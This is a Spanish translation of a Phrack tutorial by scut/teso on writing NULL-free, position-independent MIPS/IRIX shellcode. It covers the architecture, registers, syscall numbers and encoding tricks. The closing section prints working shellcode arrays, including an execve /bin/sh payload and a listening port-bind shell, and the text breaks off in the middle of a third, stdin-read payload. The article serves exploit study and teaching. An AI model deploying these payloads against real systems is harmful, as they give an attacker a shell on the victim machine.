@@ -1,0 +1,783 @@
+                      - P H R A C K   M A G A Z I N E -
+
+                            Volumen 0xa Numero 0x38
+                                  05.01.2000
+                                  0x0f[0x10]
+
+|---------------------- ESCRIBIENDO SHELLCODE MIPS/IRIX ----------------------|
+|-----------------------------------------------------------------------------|
+|--------------------------------- scut/teso ---------------------------------|
+
+
+----|  Intro
+
+Escribir shellcode para la plataforma MIPS/Irix no es muy diferente a
+escribir shellcode para la arquitectura x86.  Hay, sin embargo, unos trucos
+peor conocidos cuando se intenta escribir shellcode limpio (que no tiene
+ningun byte NULL y funciona completamente independiente de su posicion).
+
+Este peque~o texto te proveera un curso para escribir shellcode IRIX para
+usar en exploits.  Cubre las cosas basicas que necesitas saber para
+empezar a escribir shellcode IRIX basico.  Esta dividido en las siguientes
+secciones:
+
+    - El sistema operativo IRIX
+    - Arquitectura MIPS
+    - Instrucciones MIPS
+    - Registros MIPS
+    - El lenguaje assembler MIPS
+    - Representacion de funcion de lenguaje de alto nivel
+    - Syscalls y Exceptions
+    - Syscalls IRIX
+    - Construcciones comunes
+    - Sintonizando el shellcode
+    - Shellcode ejemplo
+    - Referencias
+
+
+----|  El sistema operativo IRIX
+
+El sistema operativo Irix fue desarrollado independientemente por Sillicon
+Graphics y es un UNIX System V.4 compliant.  Ha sido dise~ado para la CPU
+MIPS, que tiene una historia unica y fue pionera en 64 bits y tecnologia
+RISC.  La actual version de Irix es la 6.5.7.  Hay dos versiones mayores,
+llamadas feature (6.5.7f) y maintenance (6.5.7m) realease, de las cuales
+la feature release esta focalizada en nuevas caracteristicas y
+tecnologias y la maintenance release en arreglos de bugs y estabilidad.
+Todas las plataformas Irix modernas son compatibles con binario y esta
+discusion de shellcode y los shellcodes de ejemplo han sido testeados en mas
+de media docena de diferentes sistemas de computadoras Irix.
+
+
+----|  Arquitectura MIPS
+
+Primero que todo tienes que tener algun conocimiento basico acerca de la
+arquitectura de la CPU MIPS.  Hay muchos tipos diferentes de CPU MIPS, las
+mas comunes son las series R4x00 y R10000 (que comparten el mismo
+instruction set).
+
+Una CPU MIPS es una tipica CPU basada en RISC, lo cual significa reduced
+instruction set con menos instrucciones que una CPU CISC, tal como la x86.
+El concepto principal de una CPU RISC es una brecha entre simplicidad y
+concurrencia:  Hay menos instrucciones, pero las existentes pueden
+ser ejecutadas rapidamente y en paralelo.  Debido a este peque~o numero de
+instrucciones hay menos redundancia por instruccion, y algunas cosas solo
+pueden ser hechas usando una sola instruccion, mientras en una CPU CISC esto
+solo puede ser alcanzado usando una variedad de instrucciones diferentes,
+haciendo cada una basicamente lo mismo.  Como resultado de esto, el codigo
+maquina MIPS es mas grande que el codigo maquina CISC, ya que a menudo
+son requeridas multiples instrucciones para realizar la misma operacion
+que hacen las CPU CISC con una sola instruccion.
+
+Sin embargo, multiples instrucciones no resultan en codigo mas lento.
+Esto es un suceso de la velocidad de ejecucion global, que es extremadamente
+alta por la ejecucion paralela y las instrucciones.
+
+En una CPU MIPS la concurrencia es muy avanzada, y la CPU tiene un pipeline
+con cinco slots, que significa que cinco instrucciones son procesadas al
+mismo tiempo y cada instruccion tiene cinco niveles, desde el pipestage IF
+inicial (instruction fetch) al ultimo, el pipestage WB (write back).
+
+Debido a que las instrucciones coinciden con la pipeline, hay algunas
+"anomalias" que tienen que ser consideradas cuando se escribe codigo maquina
+MIPS:
+
+     - hay un delay de slot rama: las instrucciones siguiendo la instruccion
+       rama siguen en la pipeline y es ejecutada despues de que ha tomado
+       lugar el jump.
+     - la direccion de retorno para subrutinas ($ra) y syscalls (C0_EPC)
+       apuntan no a la instruccion despues de la instruccion branch/jump/
+       syscall sino a la instruccion despues de la instruccion del delay
+       de slot rama
+     - ya que cada instruccion es dividida en cinco pipestages el dise~o
+       MIPS ha reflejado esto en las instrucciones mismas: cada instruccion
+       es 32 bits de ancha (4 bytes) y puede ser dividida la mayoria de las
+       veces en segmentos que corresponden con cada pipestage
+
+
+----|  Instrucciones MIPS
+
+Las instrucciones MIPS no tienen solo 32 bits de largo, generalmente comparten
+un mapeo similar tambien.  Una instruccion puede ser dividida en las
+siguientes secciones:
+
+      + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
+       31302928272625242322212019181716151413121110 9 8 7 6 5 4 3 2 1 0
+      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+      | op        | sub-op  |xxxxxxxxxxxxxxxxxxxxxxxxxxxxx| subcode   |
+      +-----------+---------+-----------------------------+-----------+
+
+El campo "op" denota el opcode primario de seis bit.  Algunas instrucciones,
+tales como long jumps (lee a continuacion) tienen un codigo unico aqui, el
+resto esta agrupado por funcion.  La seccion "sub-op", que tiene cinco bytes
+de largo puede representar a un sub opcode especifico como extension al
+opcode primario o puede ser un bloque de registro.  Un bloque de registro
+es siempre cinco bytes de largo y slecciona uno de los registros CPU para
+una operacion. El subcode es el opcode para las instrucciones aritmeticas
+y logicas, que tienen un opcode primario de cero.
+
+Las instrucciones logicas y aritmeticas comparten un atributo RISC-unico:
+No funcionan con dos registros, tales como instrucciones comunes x86, pero
+usan tres registros, llamados "destino", "objetivo" y "fuente".  Esto permite
+codigo mas flexible, si sigues queriendo instrucciones tipo CISC, tales como
+"add %eax, %ecx", tan solo usa el mismo registro destino y objetivo para
+la operacion.
+
+Una instruccion MIPS tipica se ve asi:
+
+    or   a0, a1, t4
+
+que es facil de representar en C como "a0 = a1 | t4".  El orden es casi
+siempre equivalente a una simple expresion C.
+
+Algunas instrucciones simples estan listadas a continuacion:
+
+- dest, source, target y register son registros (lee la seccion sobre
+  registros MIPS a continuacion).
+- value es un valor de 16 bits, firmado o no, dependiendo de la instruccion.
+- offset es un offset relativo de 16 bits. loffset es un offset de 26 bits,
+  que es cambiado para que parezca un boundary de cuatro bytes.
+
+  or      dest, source, target     logical or: dest = source | target
+  nor     dest, source, target     logical not or: d = ~ (source | target)
+  add     dest, source, target     add: dest = source + target
+  addu    dest, source, value      add immediate signed: dest = source + value
+  and     dest, source, target     logical and: dest = source & target
+  beq     source, target, offset   if (source == target) goto offset
+  bgez    source, offset           if (source >= 0) goto offset
+  bgezal  source, offset           if (source >= 0) offset ()
+  bgtz    source, offset           if (source > 0) goto offset
+  bltz    source, offset           if (source < 0) goto offset
+  bltzal  source, offset           if (source < 0) offset ()
+  bne     source, target, offset   if (source != target) goto offset
+  j       loffset                  goto loffset (within 2^28 byte range)
+  jr      register                 jump to address in register
+  jal     loffset                  loffset (), store retaddr in $ra
+  li      dest, value              load imm.: expanded to either ori or addiu
+  lw      dest, offset             dest = *((int *) (offset))
+  slt     dest, source, target     signed: dest = (source < target) ? 1 : 0
+  slti    dest, source, value      signed: dest = (source < value) ? 1 : 0
+  sltiu   dest, source, value      unsigned: dest = (source < value) ? 1 : 0
+  sub     dest, source, target     dest = source - target
+  sw      source, offset           *((int *) offset) = source
+  syscall                          raise syscall exception
+  xor     dest, source, target     dest = source ^ target
+  xori    dest, source, value      dest = source ^ value
+
+Esto obviamente no esta completo.  Sin embargo, cubre las instrucciones
+mas importantes para escribir shellcode.  La mayoria de las instrucciones
+en los shellcodes ejemplo pueden ser encontradas aqui.  Para una lista
+de instrucciones completa lee [1] o [2].
+
+
+----|  Registros MIPS
+
+La CPU MIPS tiene muchos registros. Ya que sabemos que los registros son
+direccionados usando un bloque de cinco bits, deben haber 32 registros,
+$0 a $31. Son todos iguales excepto por $0 y $31.  Para $0 el caso es
+muy simple: No importa lo que le hagas al registro, siempre contiene cero.
+Esto es practico para muchas instrucciones aritmeticas y puede resultar
+en un dise~o de codigo elegante.  Al registro $0 se le ha sido asignado el
+nombre simbolico $zero.  El registro $31 es tambien llamado $ra, por
+"return address".  Porque un registro deberia siempre contener una
+direccion de retorno si hay una linda pila para guardarlo?  Y como deberia
+ser manejada la recursion de otro modo? Bueno, la respuesta corta es, no
+hay una pila real y si funciona.  Para la respuesta larga discutiremos
+brevemente que pasa cuando una funcion es llamada en una CPU RISC.  Cuando
+esto es hecho una instruccion especial llamada "jal" es utilizada.  La
+instruccion sobreescribe el contenido del registro $ra ($31) con la
+direccion de retorno apropiada y luego salta a una direccion arbitraria.
+La funcion llamada sin embargo ve la direccion de retorno en $ra y una
+vez finalizada salta hacia atras (usando la instruccion "jr") a la
+direccion de retorno.  Pero que si la funcion quiere llamar a funciones
+tambien?  Entonces hay un segmento tipo stack en el que la funcion puede
+guardar una direccion de retorno, luego restaurarla y luego continuar
+el funcionamiento como es usual.
+
+Porque "tipo stack"?  Porque hay solo una pila por convencion, y cualquier
+registro puede ser utilizado para comportarse como una pila.  Sin embargo,
+no hay instrucciones push o pop, y el registro tiene que ser ajustado
+manualmente.  El registro "stack" es $29, simbolicamente referido como $sp.
+La pila crece hacia las direcciones mas peque~as, tal como en la arquitectura
+x86.
+
+Hay otras convenciones de registro, tantas como registros hay.  Para
+completar aqui hay un peque~o listado:
+
+  numero  simbolico  funcion
+ -------  --------- -----------------------------------------------------------
+      $0  $zero     siempre contiene cero
+      $1  $at       utilizado por assembler (lee a continuacion), no lo uses
+   $2-$3  $v0, $v1  valores de retorno de subrutina
+   $4-$7  $a0-$a3   argumentos de subrutina
+  $8-$15  $t0-$t7   registros temporarios, pueden ser sobreescritos por
+ $16-$23  $s0-$s7   registros subrutina de subrutina, tienen que ser guardados
+                    por una funcion llamada antes de que puedan ser usados
+ $24,$25  $t8, $t9  registros temporarios, pueden ser sobreescritos por
+                    registros reservados del manejador interrupt/trap de
+ $26,$27  $k0, $k1  subrutina, no usar puntero global, usado para acceder a
+     $28  $gp       variables estaticas y externas
+     $29  $sp       stack pointer
+     $30  $s8/$fp   registro de subrutina, utilizado comunmente como
+                    frame pointer
+     $31  $ra       direccion de retorno
+
+Hay tambien 32 registros punto flotante, de 32 bits de largo cada uno
+(64 bits en CPUs MIPS nuevas). No son importantes para programacion
+de sistema, por lo que no los discutiremos aqui.
+
+
+----|  El lenguaje assembler MIPS
+
+Debido a que las instrucciones son relativamente primitivas y los
+programadores a menudo quieren realizar cosas mas complejas, el lenguaje
+assembler MIPS funciona con muchas instrucciones macro.  A veces proveen
+operaciones realmente necesarias, tales como sustraer un numero de un
+registro (que es convertido a un signed add por el assembler) para macros
+complejas, tales como encontrar el resto de una division.  Pero el assembler
+hace mucho mas ademas de proveer macros para operaciones comunes.  Ya
+mencionamos la pipeline en la cual las instrucciones son procesadas
+simultaneamente.  A menudo la ejecucion depende directamente en el orden
+dentro de la pipeline, porque los registros accedieron con las instrucciones
+escritas en el ultimo pipestage, el nivel WB (write-back) y no puede ser
+accedido antes por otras instrucciones.  Para viejas CPUs MIPS la abreviacion
+MIPS es real cuando se dice "Microcomputer without Interlocked Pipeline
+Stages", tan solo no puedes acceder al registro en la instruccion siguiendo
+directamente a la que modifica el registro.  Casi todas las CPUs MIPS
+actualmente en servicio tienen un interlock, ellas tan solo esperan hasta que
+los datos de la instruccion son escritos de nuevo al registro antes de
+permitir leerla a la siguiente instruccion.  En la practica tu solo tienes
+que preocuparte cuando escribas codigo assembler de muy bajo nivel, tal
+como shellcode :-), porque la mayoria de las veces el assembler grabara
+y reemplazara tus instrucciones para que exploten como mejor la arquitectura
+pipelineada.  Puedes desactivar grabacion y macros en cualquier assembler
+MIPS, si quieres.
+
+Las CPUs MIPS y RISC juntas no fueron dise~adas con un lenguaje de
+programacion assembler facil en mente.  Es mas dificil, sin embargo,
+programar una CPU RISC en assembler que en cualquier CPU CISC.  Incluso
+las primeras frases del MIPS Pro Assembler Manual de la corporacion MIPS
+recomiendan usar el lenguaje assembler MIPS solo para rutinas cercanas
+a hardware o programacion de sistema operativo.  En la mayoria de los casos
+un buen compilador C, tal como el MIPS desarrollado optimizara la pipeline
+y uso de registro mejor que cualquier programa podria hacerlo en assembler.
+Sin embargo, cuando se estan escribiendo shellcodes tenemos que enfrentar
+el codigo maquina desnudo y tener que escribir codigo optimizado para
+tama~o, que no contenga ningun byte NULL.  Un compilador podria usar codigo
+largo para desenrrollar loops o para usar construcciones rapidas, no podemos.
+
+
+----|  Representacion de funcion de lenguaje de alto nivel
+
+La mayoria del tiempo, una funcion normal de C puede ser representada muy
+facilmente en assembler MIPS.  Tan solo tienes que diferenciar entre funciones
+leaf y no-leaf.  Una funcion no-leaf es una funcion que no llama a ninguna
+otra funcion.  Tales funciones no necesitan guardar la direccion de retorno
+en la pila, sino mantenerla en $ra todo el tiempo.  Los argumentos para
+una funcion son guardados por la funcion llamadora en $a0, $a2 y $a3.
+Si este espacio no es suficiente es utilizado espacio extra de la pila,
+pero en la mayoria de los casos suficientes registros.  La funcion
+puede devolver dos valores de 32 bits a traves de los registros $v0 y $v1.
+Para espacio temporario la funcion llamada puede usar la pila referida como
+$sp.  Tambien comunmente los registros son guardados en la pila y luego
+restaurados desde ella.  Los registros temporarios ($t0-$t9) pueden ser
+sobreescritos en la funcion llamada sin restaurarlos despues, si la funcion
+que esta llamando quiere preservarlos, tiene que guardarlos ella misma.
+
+La pila generalmente empieza en 0x80000000 y crece hacia peque~as
+direcciones.  Como ya dijimos, es muy similar a la pila de un sistema x86.
+
+
+----|  Syscalls y Excepciones
+
+En un sistema Unix tipico hay solo dos modos en los que puede ocurrir
+la ejecucion actual: user mode y kernel mode.  En la mayoria de las
+arquitecturas modernas estos modos son directamente soportados por la CPU.
+La CPU MIPS tiene estos dos modos mas un modo extra llamado "supervisor mode".
+Fue solicitado por ingenieros en el DEC para su nuevo rango de workstations
+cuando fue dise~ada la CPU MIPS R4000.  Ya que el mercado VMS/DEC fue
+importante para MIPS, implementaron este tercer modo por solicitud de DEC
+para permitir que se pudiera correr el sistema operativo VMS en la CPU.
+Sin embargo, DEC decidio mas tarde desarrollar su propia CPU, la Alpha CPU
+y el modo permanecio sin uso.
+
+De regreso a los modos de ejecucion... en los sistemas operativos actuales
+dise~ados para la CPU MIPS solo son usados el kernel mode y el user mode.
+Para cambiar de user mode a kernel mode hay un mecanismo llamado "exceptions".
+Cuando fuere que una ejecucion actual user space no pueda ser continuada
+con exito el control es pasado al manejador de excepcion del espacio del
+kernel.
+
+Para construir shellcode tenemos que saber que podemos hacer que el kernel
+ejecute cosas importantes relacionadas con sistemas operativos como
+operaciones I/O a traves de syscall exception, que es lanzada a traves
+desde la instruccion "syscall".  La instruccion syscall se ve asi:
+
+  syscall    0000.00xx xxxx.xxxx xxxx.xxxx xx00.1100
+
+Donde x representan el codigo de syscall ancho de 20 bits, que es ignorado
+en el sistema Irix.  Para evitar bytes NULL en tu shellcode puedes
+configurar esos x-bits con datos arbitrarios.
+
+
+----|  Syscalls IRIX
+
+La siguiente lista cubre las syscalls mas importantes para uso en shellcodes.
+Despues de que todos los registros configuraron apropiadamente la instruccion
+"syscall" es ejecutada y el flujo de ejecucion es pasado al kernel.
+
+    accept
+    ------
+    int accept (int s, struct sockaddr *addr, socklen_t *addrlen);
+
+    a0 = (int) s
+    a1 = (struct sockaddr *) addr
+    a2 = (socklen_t *) addrlen
+    v0 = SYS_accept = 1089 = 0x0441
+
+    return values
+ 
+    a3 = 0 success, a3 != 0 on failure
+    v0 = new socket
+
+
+    bind
+    ----
+    int bind (int sockfd, struct sockaddr *my_addr, socklen_t addrlen);
+
+    a0 = (int) sockfd
+    a1 = (struct sockaddr *) my_addr
+    a2 = (socklen_t) addrlen
+    v0 = SYS_bind = 1090 = 0x0442
+
+    Para la familia del protocolo IN (TCP/IP) el puntero sockaddr apunta a un
+    sockaddr_in struct que tiene 16 bytes de largo y tipicamente se ve asi:
+    "\x00\x02\xaa\xbb\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
+    donde aa es ((port >> 8) & 0xff) y bb es (port & 0xff).
+
+    return values
+
+    a3 = 0 success, a3 != 0 on failure
+    v0 = 0 success, v0 != 0 on failure
+
+
+    close
+    -----
+    int close (int fd);
+
+    a0 = (int) fd
+    v0 = SYS_close = 1006 = 0x03ee
+
+    return values
+
+    a3 = 0 success, a3 != 0 on failure
+    v0 = 0 success, v0 != 0 on failure
+
+    execve
+    ------
+    int execve (const char *filename, char *const argv [], char *const envp[]);
+
+    a0 = (const char *) filename
+    a1 = (chat * const) argv[]
+    a2 = (char * const) envp[]
+    v0 = SYS_execve = 1059 = 0x0423
+
+    return values
+
+    no deberia volver sino reemplazar el proceso actual con el programa,
+    no vuelve en caso de errores
+
+
+    fcntl
+    -----
+    int fcntl (int fd, int cmd);
+    int fcntl (int fd, int cmd, long arg);
+
+    a0 = (int) fd
+    a1 = (int) cmd
+    a2 = (long) arg   en caso que el comando requiera argumentos
+    v0 = SYS_fcntl = 1062 = 0x0426
+
+    return values
+
+    a3 = 0 on success, a3 != 0 on failure
+    v0 es el valor de retorno real y depende de la operacion, lee fcntl(2)
+    para mas informacion
+
+
+    fork
+    ----
+    int fork (void);
+
+    v0 = SYS_fork = 1002 = 0x03ea
+
+    return values
+
+    a3 = 0 on success, a3 != 0 on failure
+    v0 = 0 en child process, PID del child process en parent process
+
+
+    listen
+    ------
+    int listen (int s, int backlog);
+
+    a0 = (int) s
+    a1 = (int) backlog
+    v0 = SYS_listen = 1096 = 0x0448
+
+    return values
+
+    a3 = 0 on success, a3 != 0 on failure
+
+
+    read
+    ----
+    ssize_t read (int fd, void *buf, size_t count);
+ 
+    a0 = (int) fd
+    a1 = (void *) buf
+    a2 = (size_t) count
+    v0 = SYS_read = 1003 = 0x03eb
+
+    return values
+
+    a3 = 0 on success, a3 != 0 on failure
+    v0 = number of bytes read
+
+
+    socket
+    ------
+    int socket (int domain, int type, int protocol);
+
+    a0 = (int) domain
+    a1 = (int) type
+    a2 = (int) protocol
+    v0 = SYS_socket = 1107 = 0x0453
+
+    return values
+
+    a3 = 0 on success, a3 != 0 on failure
+    v0 = new socket
+
+
+    write
+    -----
+    int write (int fileno, void *buffer, int length);
+
+    a0 = (int) fileno
+    a1 = (void *) buffer
+    a2 = (int) length
+    v0 = SYS_write = 1004 = 0x03ec
+
+    return values
+
+    a3 = 0 on success, a3 != 0 on failure
+    v0 = number of bytes written
+
+
+    La funcionalidad dup2 no es implementada como system call sino como libc
+    wrapper para close y fcntl.  Basicamente la funcion dup2 se ve asi
+    (simplificada):
+
+    int dup2 (int des1, int des2)
+    {
+        int tmp_errno, maxopen;
+
+        maxopen = (int) ulimit (4, 0);
+        if (maxopen < 0)
+        {
+            maxopen = OPEN_MAX;
+        }
+        if (fcntl (des1, F_GETFL, 0) == -1)
+        {
+            _setoserror (EBADF);
+            return -1;
+        }
+
+        if (des2 >= maxopen || des2 < 0)
+        {
+            _setoserror (EBADF);
+            return -1;
+        }
+
+        if (des1 == des2)
+        {
+            return des2;
+        }
+	tmp_errno = _oserror();
+        close (des2);
+        _setoserror (tmp_errno);
+
+        return (fcntl (des1, F_DUPFD, des2));
+    }
+
+    Entonces sin la validacion dup2 (des1, des2) puede ser re-escrito como:
+
+	close (des2);
+	fcntl (des1, F_DUPFD, des2);
+
+Que ha sido hecho en el portshell shellcode a continuacion.
+
+
+----|  Construcciones comunes
+
+Cuando se escribe shellcode siempre hay operaciones comunes, como
+obtener la direccion actual.  Aqui hay unas tecnicas que puedes utilizar
+en tu shellcode:
+
+- Obteniendo la direccion actual
+
+        li      t8, -0x7350     /* cargar t8 con -0x7350 (leet) */
+foo:    bltzal  t8, foo         /* ramificar con $ra guardado si t8 < 0 */
+        slti    t8, zero, -1    /* t8 = 0 (lee a continuacion) */
+bar:
+
+Debido a que la instruccion slti esta en el slot de delay de rama cuando
+la bltzal es ejecutada la siguiente vez bltzal no se ramificara y t8
+permanecera en cero.  $ra mantiene la direccion de la etiqueta bar cuando
+la misma etiqueta es alcanzada.
+
+- Cargando valores enteros peque~os
+
+Debido a que cada instruccion tiene 32 bits de largo no puedes cargar
+inmediatamente un valor de 32 bits en un registro sino que tienes que usar
+dos instrucciones.  La mayoria del tiempo, sin embargo, tan solo querras
+cargar valores peque~os, siguientes a 256.  Valores siguientes a 2^16 son
+guardados como un valor de 16 bits dentro de la instruccion y los valores
+siguientes a 256 resultaran en desagradables bytes NULL, que deberian
+ser evitados en un shellcode apropiado.  Por consiguiente usamos un truco
+para cargar tales valores peque~os:
+
+loading zero into reg (reg = 0):
+        slti    reg, zero, -1
+
+loading one into reg (reg = 1):
+        slti    reg, zero, 0x0101
+
+loading small integer values into reg (reg = value):
+        li      t8, -valmod     /* valmod = value + 1 */
+        not     reg, t8
+
+Por ejemplo si queremos cargar 4 en reg podemos usar:
+        li      t8, -5
+        not     reg, t8
+
+En caso de que necesites valores peque~os mas de una vez puedes tambien
+guardarlos en registros guardados ($s0 - $s7, opcionalmente $s8).
+
+- Moviendo registros
+
+En el lenguaje assembler MIPS normal puedes usar la instruccion simple move,
+que resulta en una instruccion "or", pero en el shellcode tienes que
+evitar bytes NUL, y puedes usar esta construccion, si sabes que ese valor
+en el registro es siguiente a 0xffff (65535):
+	andi	reg, source, 0xffff
+
+
+----|  Sintonizando el shellcode
+ 
+Recomiendo que escribas tus shellcodes en lenguaje assembler MIPS normal
+y luego empieces a borrar bytes NULL de arriba hacia abajo.  Para
+instrucciones de carga simple puedes usar las construcciones anteriores.
+Para instrucciones escenciales trata de jugar con los diferentes registros,
+en algunos casos los bytes NULL pueden ser borrados desde instrucciones
+aritmeticas y logicas usando registros mas altos, tales como $t8 o $s7.
+Luego trata de reemplazar la instruccion sola con dos o tres realizando
+lo mismo.  Haz uso de los valores de retorno de syscalls o contenidos
+de registros conocidos.  Se creativo, usa una referencia de instrucciones
+MIPS de [1] o [2] y tu cerebro y siempre encontraras un buen reemplazo.
+
+Una vez que has liberado tu shellcode de bytes NULL notaras que el tama~o
+se ha incrementado y que tu shellcode esta completamente hinchado.  No
+te preocupes, esto es normal, no hay casi nada que puedas hacer, el codigo
+RISC es casi siempre mas largo que el mismo codigo en x86.  Pero puedes
+hacer algunas peque~as optimizaciones para decrementar su tama~o.  Primero
+trata de encontrar reemplazos para bloques de instruccion, donde mas de
+una instruccion es usada para hacer una cosa.  Siempre echa un vistazo al
+contenido actual del registro y haz uso de valores de retorno o valores
+cargados previamente.  A veces grabar te ayuda a evitar saltos.
+
+
+----|  Shellcode ejemplo
+
+Todos los shellcodes han sido testeados en los siguiente sistemas, (gracias
+a vax, oxigen, zap y hendy):
+
+R4000/6.2, R4000/6.5, R4400/5.3, R4400/6.2, R4600/5.3, R5000/6.5 and
+R10000/6.4.
+
+<++> p56/MIPS-shellcode/sh_execve.h !4959db03
+/* 68 byte MIPS/Irix PIC execve shellcode. -scut/teso
+ */
+unsigned long int shellcode[] = {
+		0xafa0fffc,	/* sw		$zero, -4($sp)		*/
+		0x24067350,	/* li		$a2, 0x7350		*/
+/* dpatch: */	0x04d0ffff,	/* bltzal	$a2, dpatch		*/
+		0x8fa6fffc,	/* lw		$a2, -4($sp)		*/
+		/* a2 = (char **) envp = NULL */
+
+		0x240fffcb,	/* li		$t7, -53		*/
+		0x01e07827,	/* nor		$t7, $t7, $zero		*/
+		0x03eff821,	/* addu		$ra, $ra, $t7		*/
+
+		/* a0 = (char *) pathname */
+		0x23e4fff8,	/* addi		$a0, $ra, -8		*/
+
+		/* fix 0x42 dummy byte in pathname to shell */
+		0x8fedfffc,	/* lw		$t5, -4($ra)		*/
+		0x25adffbe,	/* addiu	$t5, $t5, -66		*/
+		0xafedfffc,	/* sw		$t5, -4($ra)		*/
+
+		/* a1 = (char **) argv */
+		0xafa4fff8,	/* sw		$a0, -8($sp)		*/
+		0x27a5fff8,	/* addiu	$a1, $sp, -8		*/
+
+		0x24020423,	/* li		$v0, 1059 (SYS_execve)	*/
+		0x0101010c,	/* syscall				*/
+		0x2f62696e,	/* .ascii	"/bin"			*/
+		0x2f736842,	/* .ascii	"/sh", .byte 0xdummy	*/
+};
+<-->
+<++> p56/MIPS-shellcode/shc_portshell-listener.h !db48e22a
+/* 364 byte MIPS/Irix PIC listening portshell shellcode. -scut/teso
+ */
+unsigned long int shellcode[] = {
+		0x2416fffd,	/* li		$s6, -3			*/
+		0x02c07027,	/* nor		$t6, $s6, $zero		*/
+		0x01ce2025,	/* or		$a0, $t6, $t6		*/
+		0x01ce2825,	/* or		$a1, $t6, $t6		*/
+		0x240efff9,	/* li		$t6, -7			*/
+		0x01c03027,	/* nor		$a2, $t6, $zero		*/
+		0x24020453,	/* li		$v0, 1107 (socket)	*/
+		0x0101010c,	/* syscall				*/
+		0x240f7350,	/* li		$t7, 0x7350 (nop)	*/
+
+		0x3050ffff,	/* andi		$s0, $v0, 0xffff	*/
+		0x280d0101,	/* slti		$t5, $zero, 0x0101	*/
+		0x240effee,	/* li		$t6, -18		*/
+		0x01c07027,	/* nor		$t6, $t6, $zero		*/
+		0x01cd6804,	/* sllv		$t5, $t5, $t6		*/
+		0x240e7350,	/* li		$t6, 0x7350 (port)	*/
+		0x01ae6825,	/* or		$t5, $t5, $t6		*/
+		0xafadfff0,	/* sw		$t5, -16($sp)		*/
+		0xafa0fff4,	/* sw		$zero, -12($sp)		*/
+		0xafa0fff8,	/* sw		$zero, -8($sp)		*/
+		0xafa0fffc,	/* sw		$zero, -4($sp)		*/
+		0x02102025,	/* or		$a0, $s0, $s0		*/
+		0x240effef,	/* li		$t6, -17		*/
+		0x01c03027,	/* nor		$a2, $t6, $zero		*/
+		0x03a62823,	/* subu		$a1, $sp, $a2		*/
+		0x24020442,	/* li		$v0, 1090 (bind)	*/
+		0x0101010c,	/* syscall				*/
+		0x240f7350,	/* li		$t7, 0x7350 (nop)	*/
+
+		0x02102025,	/* or		$a0, $s0, $s0		*/
+		0x24050101,	/* li		$a1, 0x0101		*/
+		0x24020448,	/* li		$v0, 1096 (listen)	*/
+		0x0101010c,	/* syscall				*/
+		0x240f7350,	/* li		$t7, 0x7350 (nop)	*/
+
+		0x02102025,	/* or		$a0, $s0, $s0		*/
+		0x27a5fff0,	/* addiu	$a1, $sp, -16		*/
+		0x240dffef,	/* li		$t5, -17		*/
+		0x01a06827,	/* nor		$t5, $t5, $zero		*/
+		0xafadffec,	/* sw		$t5, -20($sp)		*/
+		0x27a6ffec,	/* addiu	$a2, $sp, -20		*/
+		0x24020441,	/* li		$v0, 1089 (accept)	*/
+		0x0101010c,	/* syscall				*/
+		0x240f7350,	/* li		$t7, 0x7350 (nop)	*/
+		0x3057ffff,	/* andi		$s7, $v0, 0xffff	*/
+
+		0x2804ffff,	/* slti		$a0, $zero, -1		*/
+		0x240203ee,	/* li		$v0, 1006 (close)	*/
+		0x0101010c,	/* syscall				*/
+		0x240f7350,	/* li		$t7, 0x7350 (nop)	*/
+
+		0x02f72025,	/* or		$a0, $s7, $s7		*/
+		0x2805ffff,	/* slti		$a1, $zero, -1		*/
+		0x2806ffff,	/* slti		$a2, $zero, -1		*/
+		0x24020426,	/* li		$v0, 1062 (fcntl)	*/
+		0x0101010c,	/* syscall				*/
+		0x240f7350,	/* li		$t7, 0x7350 (nop)	*/
+
+		0x28040101,	/* slti		$a0, $zero, 0x0101	*/
+		0x240203ee,	/* li		$v0, 1006 (close)	*/
+		0x0101010c,	/* syscall				*/
+		0x240f7350,	/* li		$t7, 0x7350 (nop)	*/
+
+		0x02f72025,	/* or		$a0, $s7, $s7		*/
+		0x2805ffff,	/* slti		$a1, $zero, -1		*/
+		0x28060101,	/* slti		$a2, $zero, 0x0101	*/
+		0x24020426,	/* li		$v0, 1062 (fcntl)	*/
+		0x0101010c,	/* syscall				*/
+		0x240f7350,	/* li		$t7, 0x7350		*/
+
+		0x02c02027,	/* nor		$a0, $s6, $zero		*/
+		0x240203ee,	/* li		$v0, 1006 (close)	*/
+		0x0101010c,	/* syscall				*/
+		0x240f7350,	/* li		$t7, 0x7350 (nop)	*/
+
+		0x02f72025,	/* or		$a0, $s7, $s7		*/
+		0x2805ffff,	/* slti		$a1, $zero, -1		*/
+		0x02c03027,	/* nor		$a2, $s6, $zero		*/
+		0x24020426,	/* li		$v0, 1062 (fcntl)	*/
+		0x0101010c,	/* syscall				*/
+		0x240f7350,	/* li		$t7, 0x7350 (nop)	*/
+
+		0xafa0fffc,	/* sw		$zero, -4($sp)		*/
+		0x24068cb0,	/* li		$a2, -29520		*/
+		0x04d0ffff,	/* bltzal	$a2, pc-4		*/
+		0x8fa6fffc,	/* lw		$a2, -4($sp)		*/
+		0x240fffc7,	/* li		$t7, -57		*/
+		0x01e07827,	/* nor		$t7, $t7, $zero		*/
+		0x03eff821,	/* addu		$ra, $ra, $t7		*/
+		0x23e4fff8,	/* addi		$a0, $ra, -8		*/
+		0x8fedfffc,	/* lw		$t5, -4($ra)		*/
+		0x25adffbe,	/* addiu	$t5, $t5, -66		*/
+		0xafedfffc,	/* sw		$t5, -4($ra)		*/
+		0xafa4fff8,	/* sw		$a0, -8($sp)		*/
+		0x27a5fff8,	/* addiu	$a1, $sp, -8		*/
+		0x24020423,	/* li		$v0, 1059 (execve)	*/
+		0x0101010c,	/* syscall				*/
+		0x240f7350,	/* li		$t7, 0x7350 (nop)	*/
+		0x2f62696e,	/* .ascii	"/bin"			*/
+		0x2f736842,	/* .ascii	"/sh", .byte 0xdummy	*/
+};
+<-->
+<++> p56/MIPS-shellcode/shc_read.h !1996c2bb
+/* 40 byte MIPS/Irix PIC stdin-read shellcode. -scut/teso
+ */
+unsigned long int shellcode[] = {
+		0x24048cb0,	/* li		$a0, -0x7350		*/
+/* dpatch: */	0x0490ffff,	/* bltzal	$a0, dpatch		*/
+		0x2804ffff,	/* slti		$a0, $zero, -1		*/
+		0x240fffe3,	/* li		$t7, -29		*/
+		0x01e07827,	/* nor		$t7, $t7, $zero		*/
+		0x03ef2821,	/* addu		$a1, $ra, $t7		*/
+		0x24060201,	/* li		$a2, 0x0201 (513 bytes)	*/
